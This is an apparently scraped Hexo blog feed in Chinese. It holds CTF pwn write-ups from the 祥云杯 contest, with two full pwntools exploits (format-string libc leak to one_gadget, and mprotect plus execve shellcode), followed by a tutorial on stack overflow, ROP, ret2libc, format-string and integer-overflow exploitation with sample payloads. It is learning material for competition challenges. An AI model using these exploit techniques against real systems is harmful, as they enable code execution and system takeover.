class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.104.70.90&#x27;</span>,<span class="number">25315</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(size)</span><br><span class="line">cmd(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">con</span>):</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;%13$s\x00\x00\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x3c36e0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">sys_addr = libc_base + <span class="number">0x453a0</span></span><br><span class="line">_rtld_global = libc_base + <span class="number">0x5f0040</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xcd173</span>,<span class="number">0xcd248</span>,<span class="number">0xf03a4</span>,<span class="number">0xf03b0</span>,<span class="number">0xf1247</span>,<span class="number">0xf67f0</span>]</span><br><span class="line">og = libc_base + one[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;%7$s\x00\x00\x00\x00&quot;</span>+p64(_rtld_global+<span class="number">3848</span>))</span><br><span class="line">p.sendline(p64(og))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="JigSaw’sCage"><a href="#JigSaw’sCage" class="headerlink" title="JigSaw’sCage"></a>JigSaw’sCage</h1><p>scanf处有漏洞，实际读入了 %ld 的内容，从而可以覆盖掉v2</p><p>覆盖掉v2后，让v2&gt;14</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xiangyunbei-wp/1635584852428781/6af8743f82efcdeda46ac9b27947bf6a641c3e66.png" alt="q"></p><p>就能利用mprotect函数给堆地址加权限(7:rwx)</p><p>然后再在堆中写入shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;47.104.71.220&#x27;,10273)</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;hhhh&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100000000000</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>              *可以通过x/i查看这些机器码的意思</span><br><span class="line">sc2 = <span class="string">&quot;\xf7\xe6\x50\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span>     </span><br><span class="line">pay = sc1 + p8(<span class="number">0xe9</span>)+p8(<span class="number">0x11</span>)+p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pay = pay.ljust(<span class="number">16</span>,<span class="string">&#x27;\xc3&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,sc2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">gift(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 祥云杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大总结</title>
      <link href="/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/"/>
      <url>/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-nc直接连"><a href="#0x01-nc直接连" class="headerlink" title="0x01 nc直接连"></a>0x01 nc直接连</h1><p>当题目中直接出现了**”/bin/sh”<strong>、</strong>cat flag**时运行后nc即可</p><p><strong><em>例题：攻防世界 get_shell</em></strong></p><h1 id="0x02-变量的覆盖"><a href="#0x02-变量的覆盖" class="headerlink" title="0x02 变量的覆盖"></a>0x02 变量的覆盖</h1><p>1.算出两变量在段中的差值:</p><ul><li><p>​     可以直接在payload中直接写算式【’a’*(0x6C-0x68)】</p></li><li><p>​     也可以用计算器算出结果后再写入payload【’a’*4】</p></li></ul><p>2.再加上想输入的值</p><p><strong><em>例题：攻防世界 hello_pwn</em></strong></p><p><img src="/images/zj5.png" alt="zj5"></p><p><img src="/images/zj6.png" alt="zj6"></p><p>可以看到unk_601068允许输入的长度是10，而unk_601068和dword_60106C在.bss段相差4（6c-68）</p><p>于是可以想到在unk_601068中输入4个数覆盖掉dword_60106C再输入自己想要的值</p><p>payload = ‘a’*4 + p64(1853186401)</p><h1 id="0x03-栈溢出"><a href="#0x03-栈溢出" class="headerlink" title="0x03 栈溢出"></a>0x03 栈溢出</h1><p>栈溢出是指向栈中写入了超出限定长度的数据，溢出的数据会覆盖栈中其它数据，从而影响程序的运行。</p><p><strong>前提：stack未开启</strong></p><p>算出变量到ret的长度，再写入想输入的值即可</p><p><strong><em>例题：攻防世界 level0</em></strong></p><p><img src="/images/zj7.png" alt="zj7"></p><p><img src="/images/zj8.png" alt="zj8"></p><p><img src="/images/zj9.png" alt="zj9"></p><p><img src="/images/zj10.png" alt="zj10"></p><p>可以看出没有开启栈保护，200远大于80</p><p>直接栈溢出即可</p><p>payload = ‘a’*(0x80+0x08) + p64(0x040059A)</p><h1 id="0x04-gets-溢出漏洞"><a href="#0x04-gets-溢出漏洞" class="headerlink" title="0x04 gets()溢出漏洞"></a>0x04 gets()溢出漏洞</h1><p>例如 gets(s) , 不管 s  的空间是否够用，gets函数一直都会往s里输东西，这就存在溢出问题</p><p>于是可以用gets()溢出来达到修改某个变量的值的效果</p><p><strong><em>例题：攻防世界 when_did_you_born</em></strong></p><p><img src="/images/zj11.png" alt="zj11"></p><p>gets函数的漏洞，利用v4覆盖掉v5的地址后改为1926即可</p><p><img src="/images/zj12.png" alt="zj12"></p><h1 id="0x05-ROP"><a href="#0x05-ROP" class="headerlink" title="0x05 ROP"></a>0x05 ROP</h1><p>一直把栈溢出的作用当成了ROP的作用，后来才发现栈溢出只是ROP里的一个环节</p><p>栈溢出控制点一般是在ret处，ROP的核心思想就是<strong>利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程</strong></p><h2 id="0x001-ret2text"><a href="#0x001-ret2text" class="headerlink" title="0x001 ret2text"></a>0x001 ret2text</h2><p>ret2text 又可以理解为是ret to text，顾名思义就是<strong>将应该返回EIP的地址改成text中的某个地址</strong></p><p>上面0x03栈溢出提到的level0就是个很好的例子，就不赘述了</p><p>讲讲攻防世界的level2：</p><p><strong><em>例题：攻防世界level2</em></strong>（system内并没有写入“/bin/sh”地址）</p><p><img src="/images/zj13.png" alt="zj13"></p><p><img src="/images/zj14.png" alt="zj14"></p><p>这应该是属于ret2text的一种变式，很明显的栈溢出</p><p>按f12发现给出了system和”/bin/sh”，但是点开system会发现system内并没有写入“/bin/sh”</p><p><img src="/images/zj24.png" alt="zj24"></p><p>“/bin/sh”的地址被单独给出来了</p><p><img src="/images/zj25.png" alt="zj25"></p><p>所以要在payload中将“/bin/sh”写入system</p><p>system()和“/bin/sh”的地址怎么找呢？</p><p>一种是在IDA中直接找（之前太菜找不到，尤其是找system）</p><p>一种是在payload中通过函数查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br></pre></td></tr></table></figure><p>最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*(0x88+0x4) + p32(sys_addr) + &#39;aaaa&#39; + p32(sh_addr)# &#39;aaaa&#39;是system函数的返回地址</span><br></pre></td></tr></table></figure><p><strong><em>例题：攻防世界cgpwn2</em></strong>（ 没有/bin/sh）</p><p>可将/bin/sh写入未初始化变量                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </p><h2 id="0x002-ret2shellcode"><a href="#0x002-ret2shellcode" class="headerlink" title="0x002 ret2shellcode"></a>0x002 ret2shellcode</h2><p><strong>将返回地址（EIP）覆盖到我们插入shellcode的首地址</strong></p><p><strong>前提：NX未开启</strong></p><p>先讲讲shellcode的概念：shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。说白了就是一段能得到权限的独立代码</p><p>利用pwntools中自带的shellcraft基本写法（应该可以当模板记）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前缀：context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure><p><strong><em>例题：攻防世界string</em></strong></p><p>详情见其他博客</p><h2 id="0x003-ret2libc"><a href="#0x003-ret2libc" class="headerlink" title="0x003 ret2libc"></a>0x003 ret2libc</h2><p>当开启了NX时，数据所在的内存页会标记为不可执行，此时再执行shellcode就会抛出异常。既然注入新代码不可行，那么就复用程序中已有的代码。而libc.so几乎在每个程序执行时都会加载，就可以利用libc中的函数。（当然 .text 中本身就有可用函数更好 , .text走投无路才会想着用libc）</p><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><p>具体GOT、PLT知识见：<a href="https://linyt.blog.csdn.net/article/details/51635768">https://linyt.blog.csdn.net/article/details/51635768</a></p><p>整个看了个大概，但是有些地方还是有点懵</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GCC编译（一段完整代码的运行）可分为预处理、编译、汇编、链接四个阶段</p><p>当处在汇编阶段时，所有元素的地址都是虚拟的，链接操作后，所有元素的地址才会被修改（重定位）为实际地址</p><p>printf函数位于glibc动态库中，编译阶段编译器并不知道printf函数是在suoyiglibc库中的（链接阶段是可以知道printf定义在哪的，只是如果定义在动态库就不知道具体的地址），于是链接器会生成一段额外的小代码片段来获取printf函数地址，并完成对它的调用。</p><p>GOT表示存放函数地址的数据表，PLT表表示额外代码段表。</p><p><img src="/images/zj39.png" alt="zj39"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>附件一般会给出libc.so的文件</p><p>暂时只发现了两种算法，但是原理都是一样的，当有其中一个函数的真实地址后，其他函数的真实地址可以根据偏移值算出</p><p>①算出“参照函数“libc和elf的偏移值，以它为base，再找出所求函数的libc值，再加减base得出真实地址</p><p>例如：攻防世界forgot 的exp</p><p><img src="/images/zj40.png" alt="zj40"></p><p>②算出所求函数与”参照函数“在libc中的偏移值，等到知道”参照函数“的真实地址后，再根据此偏移值算所求函数的真实地址</p><p>例如：攻防世界leve3 的exp</p><p><img src="/images/zj41.png" alt="zj41"></p><p><strong><em>例题：攻防世界level3</em></strong></p><p>详情见其他博客</p><h1 id="0x06-格式化字符串漏洞"><a href="#0x06-格式化字符串漏洞" class="headerlink" title="0x06 格式化字符串漏洞"></a>0x06 格式化字符串漏洞</h1><p>参考：<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p>（也不知道讲不讲的清。。。。）</p><p>首先了解一个格式化字符串“%n”</p><p>%n表示的是将<strong>已经打印出来的字符个数</strong>，赋值给一个变量</p><p><img src="/images/zj26.png" alt="zj26"></p><p>%n之前打印了5个a，所以n的值变成了5。</p><h2 id="漏洞成因和基本原理"><a href="#漏洞成因和基本原理" class="headerlink" title="漏洞成因和基本原理"></a>漏洞成因和基本原理</h2><p>正常的printf：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n&#x3D;5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但有人偷懒会写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]&#x3D;&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这是可以输出的，输出就为neuqcsa</p><p>但是当我们输入的是字符串就会出问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如我们输入的字符串是“%x%x%x”</p><p><img src="/images/zj27.png" alt="zj27"></p><p>可以看到本意是想输出字符串“%x%x%x”,却输出了内存中的一段地址</p><p>再看看printf函数的堆栈图：（参数从右向左入栈）</p><p><img src="/images/zj28.png" alt="zj28"></p><p><img src="/images/zj29.png" alt="zj29"></p><p><strong>printf函数并不知道参数的个数，它只会通过指针去搜索格式化字符串，然后根据格式化字符串的类型输出相应参数的值，直到搜索完最后一个格式化字符串</strong></p><p>所以尽管没有参数，也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><h2 id="任意内存的读取及任意内存写入"><a href="#任意内存的读取及任意内存写入" class="headerlink" title="任意内存的读取及任意内存写入"></a>任意内存的读取及任意内存写入</h2><p>任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向<strong>字符串首地址</strong>的指针，作用是<strong>输出这个字符串</strong>。</p><p><strong>局部变量是存储在栈中的</strong></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到：</p><p><img src="/images/zj30.png" alt="zj30"></p><p>看下堆栈图：<br> 这是调用scanf函数前的堆栈图。</p><p><img src="/images/zj32.png" alt="zj32"></p><p>输入字符串后的堆栈图：</p><p><img src="/images/zj31.png" alt="zj31"></p><p>调用printf函数的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax，数组首地址</span><br><span class="line">push eax  </span><br><span class="line">call printf</span><br></pre></td></tr></table></figure><p>该过程只是将数组的首地址入栈，此时堆栈图如下。</p><p><img src="/images/zj33.png" alt="zj33"></p><p>所以在格式化字符串里用很多的%x 就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p><p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br> %&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br> 但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化字符串开始的第一个，应该是%7 $n</p><h3 id="修改内存"><a href="#修改内存" class="headerlink" title="修改内存"></a>修改内存</h3><p><img src="/images/zj34.png" alt="zj34"></p><p>得到b的地址</p><p><img src="/images/zj35.png" alt="zj35"></p><p>这里是第九个参数。<br> 接着用shellcode编码将b的地址写入，并查看能否写入成功。</p><p><img src="/images/zj36.png" alt="zj36"></p><p>用%n修改其值。</p><p><img src="/images/zj37.png" alt="zj37"></p><p>因为%n之前打印了75个字符，所以这里将b的值从0修改为75</p><p><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。</p><p><img src="/images/zj38.png" alt="zj38"></p><p>在%n之前打印了4个字符，所以b的值直接被修改为4了</p><p><strong><em>例题：攻防世界CGfsb</em></strong></p><p><img src="/images/zj17.png" alt="zj17"></p><p><img src="/images/zj18.png" alt="zj18"></p><p>pwnme为8时就能拿到flag，问题是并没有能输入pwnme的地方</p><p>但是pwnme的上方有一个printf（&amp;s）明显的格式化字符串漏洞，可以以此来改变pwnme的值</p><p>看看偏移值：</p><p><img src="/images/zj19.png" alt="zj19"></p><p>可以看出偏移值是10</p><p>上exp：</p><p><img src="/images/zj20.png" alt="zj20"></p><p>注意%10$n处要加引号</p><h1 id="0x07-strcpy漏洞"><a href="#0x07-strcpy漏洞" class="headerlink" title="0x07 strcpy漏洞"></a>0x07 strcpy漏洞</h1><p>参考：<a href="https://blog.csdn.net/bjbz_cxy/article/details/80388908">https://blog.csdn.net/bjbz_cxy/article/details/80388908</a></p><p>strcpy是标准C库函数，不会去检查越界问题，所以它可以直接将内存中的值修改</p><h1 id="0x08-整数溢出"><a href="#0x08-整数溢出" class="headerlink" title="0x08 整数溢出"></a>0x08 整数溢出</h1><p>参考:<a href="https://zhuanlan.zhihu.com/p/28563004">https://zhuanlan.zhihu.com/p/28563004</a></p><p>整数分为有符号和无符号</p><p>异常情况有三种：①溢出   ②回绕   ③截断</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>表现在有符号整数上，有符号整数有正值、负值和零，有向上溢出和向下溢出两种。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) –  1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出,  向下超出&lt;-2^(8k-1), 我们称之为向下溢出. </p><p>对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x &#x3D; 125 + 5;</span><br></pre></td></tr></table></figure><p>上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。</p><h2 id="回绕"><a href="#回绕" class="headerlink" title="回绕"></a>回绕</h2><p>溢出后的数会以2^(8*sizeof(type))作模运算</p><p>例如一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">  unsigned char x;</span><br><span class="line">  x &#x3D; 128 + 130;</span><br><span class="line">  printf(&quot;%d\n&quot;,x);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会输出2，因为258%256=2</p><h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><p>将一个较大宽度的数存入较小宽度的操作数中时，高位会发生截断（一般只取后八位）</p><p><strong><em>例题：攻防世界int_overflow</em></strong></p><p><a href="https://makabaka-yyds.github.io/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/">详情见</a></p><h1 id="0x09-DynELF"><a href="#0x09-DynELF" class="headerlink" title="0x09 DynELF"></a>0x09 DynELF</h1><p>具体原理见：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157</a></p><p><a href="https://www.anquanke.com/post/id/85129">【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客，安全资讯平台 (anquanke.com)</a></p><p><strong><em>例题：攻防世界pwn100</em></strong></p><p>详情见其他博客</p><h1 id="0x10-万能gadget"><a href="#0x10-万能gadget" class="headerlink" title="0x10 万能gadget"></a>0x10 万能gadget</h1><p><a href="https://xz.aliyun.com/t/5597#toc-1">万能gadget</a></p><p><strong><em>例题：攻防世界pwn100</em></strong></p><p>详情见其他博客</p><h1 id="0x0N-杂七杂八"><a href="#0x0N-杂七杂八" class="headerlink" title="0x0N  杂七杂八"></a>0x0N  杂七杂八</h1><h2 id="0x001-地址查找函数"><a href="#0x001-地址查找函数" class="headerlink" title="0x001 地址查找函数"></a>0x001 地址查找函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]#在elf这个文件中查找system函数的地址</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()#在文件中查找写有字符串“&#x2F;bin&#x2F;sh”的地址</span><br></pre></td></tr></table></figure><h2 id="0x002-关于system-bin-sh"><a href="#0x002-关于system-bin-sh" class="headerlink" title="0x002 关于system(/bin/sh)"></a>0x002 关于system(/bin/sh)</h2><p>system（）函数调用的是地址</p><p>/bin/sh只是一个字符串，所以在 f12+shift 以及查找函数查出来的都是写有 